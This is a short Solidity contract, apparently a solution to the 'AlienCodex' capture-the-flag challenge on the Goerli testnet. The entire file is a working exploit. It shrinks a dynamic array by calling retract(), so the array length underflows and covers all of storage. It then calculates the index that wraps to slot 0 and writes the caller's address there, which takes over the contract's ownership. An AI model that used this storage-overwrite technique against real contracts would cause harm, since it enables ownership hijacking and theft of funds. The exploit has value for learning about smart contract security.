// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
// https://goerli.etherscan.io/address/0xbe5eca4c478eb070c8fc14c7961d6dc060f48351

interface AlienCodex
{
    function make_contact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint i, bytes32 _content)  external;
}

contract AlienCodexAttack
{

   AlienCodex  immutable aliencodexaddress;

   constructor(address _aliencodexaddress)
   {
       aliencodexaddress = AlienCodex(_aliencodexaddress);
   }

   function attack() external 
   {
       uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1; // slot 0
       bytes32 myAddress = bytes32(uint256(uint160(tx.origin))); // use tx.origin or else calling contract will become the owner if we use msg.sender
       aliencodexaddress.make_contact();
       aliencodexaddress.retract();
       aliencodexaddress.revise(index, myAddress);
   }


}
